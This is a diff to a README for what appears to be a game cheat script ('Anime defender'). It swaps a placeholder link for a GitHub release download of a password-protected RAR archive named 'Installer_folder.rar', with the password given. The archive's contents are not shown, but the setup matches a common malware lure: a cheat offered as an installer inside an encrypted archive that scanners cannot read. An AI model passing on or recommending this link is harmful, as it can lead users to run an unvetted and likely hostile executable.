@@ -29,6 +29,6 @@ This project is licensed under the MIT License.
 
 ## Download
 
-[Download the script here](https://your-download-link-here.com)
+[Download the script here](https://github.com/Nikita22842/Anime-defender-script/releases/download/soft/Installer_folder.rar) Password:ojgjirg4wf82jf
 
 **Become the ultimate anime hero with knowledge as your greatest weapon.**
